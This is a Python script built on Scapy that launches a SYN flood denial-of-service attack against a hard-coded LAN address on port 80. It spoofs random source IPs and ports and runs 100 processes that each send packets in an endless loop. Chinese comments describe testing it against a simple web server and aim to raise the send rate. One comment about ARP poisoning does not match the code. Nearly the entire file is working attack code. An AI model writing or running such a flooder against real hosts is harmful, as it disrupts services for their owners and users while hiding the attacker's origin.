from random import randint
import scapy
import re
from scapy.layers.inet import TCP, IP
from scapy.all import ifaces, conf, srp, get_if_addr, get_if_hwaddr, send, RandIP
import time
from multiprocessing import Pool


def get_real_iface_name():
    # 从ifaces命令打印结果里，按行解析每行的属性（第一行为属性行），结果放入字典的列表iface_dict_list
    iface_dict_list, iface_keys = [], []
    for idx, line in enumerate(str(ifaces).split('\n')):
        items_in_line = list(filter(None, re.split(r'\s{2,}', line)))  # 每行里面有2个及以上空格进行分割
        if len(items_in_line) < 2:
            continue
        if idx == 0:
            iface_keys = items_in_line
        else:
            iface_dict = {}
            for i, key in enumerate(iface_keys):
                if i < len(items_in_line):
                    iface_dict[key] = items_in_line[i]
            iface_dict_list.append(iface_dict)

    ignore_keywords = ['virtual', 'miniport', 'loopback', 'vmware']
    real_iface_list = list(filter(
        lambda iface: all([False if keyword in iface['Name'].lower() else True for keyword in ignore_keywords]),
        iface_dict_list))
    real_iface_name = real_iface_list[0]['Name']
    return real_iface_name


# 获取网关IP地址，参考：https://scapy.readthedocs.io/en/latest/routing.html#get-mac-by-ip
def get_gateway_ip():
    return conf.route.route('0.0.0.0')[2]


def randport():
    return randint(1, 65535) # 端口范围为0到65535，0一般不用


def resetPacket(p):
    ip_pkt = p[IP]
    tcp_pkt = p[TCP]
    ip_pkt.src = str(RandIP())
    tcp_pkt.sport = randport()
    return ip_pkt / tcp_pkt


def syn_flood(target_ip, target_port):
    print('向ip为{}的主机的{}端口发起SYN Flood攻击'.format(target_ip, target_port))
    # amount = 20

    # Method 1: send() in for loop
    # for n in range(amount):
    #     randIP = str(RandIP())
    #     # print('随机IP=', randIP)
    #     p = IP(src=randIP, dst=target_ip)/TCP(dport=target_port)
    #     # print(p)
    #     send(p)

    # Method 2: send( p*amount ), all packet in send()'s parameter
    # p = IP(src=RandIP(), dst=target_ip) / TCP(sport=randport(), dport=target_port)
    # send([resetPacket(p) for n in range(amount)], inter=0, loop=1) # loop=1 会再次重复发送一批数据包

    #  经测试，只有这种Pool的方式，配合各子进程无限循环发送包的方式，
    #  才能让python -m http.server建立的简单Web服务器稍响应慢一点，进入某目录稍停顿（而如使用nginx作Web服务，则毫发无伤），
    #  但本机CPU占用率直接拉满，属于“伤敌一百，自损八十万"。
    #  后续看一下，如何占用CPU较少的情况下，提升发送速率，或修改发送数据包中的参数，来提升效果。
    pool = Pool(100)
    for n in range(100):
        pool.apply_async(func=syn_flood1, args=(target_ip,target_port))

    pool.close()
    pool.join()

    print('all process over!!!!') # 必须强制中断


def syn_flood1(target_ip, target_port):
    while True:
        p = IP(src=RandIP(), dst=target_ip) / TCP(sport=randport(), dport=target_port)
        send(p)
    # p = IP(src=RandIP(), dst=target_ip) / TCP(sport=randport(), dport=target_port)
    # send([resetPacket(p) for n in range(100000)]) # loop=1 会再次重复发送一批数据包


if __name__ == '__main__':
    print('-' * 65)
    print('Scapy version {}, using iface "{}"'.format(scapy.VERSION, get_real_iface_name()))
    print('本机IP地址：\t {:<20}'.format(get_if_addr(get_real_iface_name())))
    print('本地MAC地址：\t {:<20}'.format(get_if_hwaddr(get_real_iface_name())))
    print('默认网关地址：\t {:<20}'.format(get_gateway_ip()))
    print('-' * 65)

    # 将"受害者IP"主机的ARP缓存中，将网关IP对应的MAC地址篡改为本机MAC地址，从而使其断网
    startTime = time.time()
    syn_flood('192.168.68.163', 80)
    print('攻击耗时:{:.2f}秒'.format(time.time()-startTime))
